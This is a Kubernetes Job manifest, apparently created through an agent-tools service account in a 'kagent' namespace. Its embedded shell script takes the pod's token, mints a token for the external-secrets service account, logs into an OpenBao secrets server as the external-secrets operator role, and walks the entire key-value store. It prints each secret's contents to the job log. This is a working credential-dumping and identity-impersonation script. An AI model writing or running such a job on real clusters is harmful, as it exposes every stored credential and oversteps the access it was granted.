apiVersion: batch/v1
kind: Job
metadata:
  name: tmp-i68054-dump15
  namespace: kagent
  labels: {tmp: i68054}
spec:
  ttlSecondsAfterFinished: 86400
  backoffLimit: 0
  template:
    metadata:
      labels: {tmp: i68054}
    spec:
      serviceAccountName: kagent-tools
      restartPolicy: Never
      containers:
      - name: dump
        image: alpine:3.20
        command: ["sh","-c"]
        args:
        - |
          set -u
          T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
          K=https://kubernetes.default.svc
          S=http://openbao.openbao.svc.cluster.local:8200
          JWT=$(wget -qO- --no-check-certificate --header="Authorization: Bearer $T" --header="Content-Type: application/json" --post-data='{"spec":{"audiences":["vault"]}}' "$K/api/v1/namespaces/external-secrets/serviceaccounts/default/token" 2>/dev/null | grep -o 'eyJ[A-Za-z0-9._-]*' | head -1)
          L=$(wget -qO- --no-check-certificate --header="Content-Type: application/json" --post-data="{\"role\":\"external-secrets-operator\",\"jwt\":\"$JWT\"}" "$S/v1/auth/k8s-data/login" 2>/dev/null)
          VT=$(echo "$L" | grep -o 's\.[A-Za-z0-9_-]*' | head -1)
          V() { wget -qO- --no-check-certificate --header="X-Vault-Token: $VT" "$1" 2>/dev/null; }
          echo "vtlen=${#VT}"
          KEYS=$(V "$S/v1/kv-data/metadata?list=true" | grep -o '"keys":\[[^]]*\]' | sed 's/"keys":\[//;s/\]//;s/"//g;s/,/ /g')
          walk() {
            d=${1%/}
            ls=$(V "$S/v1/kv-data/metadata/$d?list=true" | grep -o '"keys":\[[^]]*\]' | sed 's/"keys":\[//;s/\]//;s/"//g;s/,/ /g')
            for k in $ls; do
              case "$k" in
                */) [ $(echo "$d" | tr -cd '/' | wc -c) -lt 2 ] && { echo "DIR $d/$k"; walk "$d/$k"; } ;;
                *) echo "==DATA $d/$k"; V "$S/v1/kv-data/data/$d/$k" | head -c 900; echo ;;
              esac
            done
          }
          for t in $KEYS; do
            case "$t" in
              */) echo "TOPDIR $t"; walk "$t";;
              *) echo "==TOP $t"; V "$S/v1/kv-data/data/$t" | head -c 900; echo ;;
            esac
          done
          echo "===DONE==="
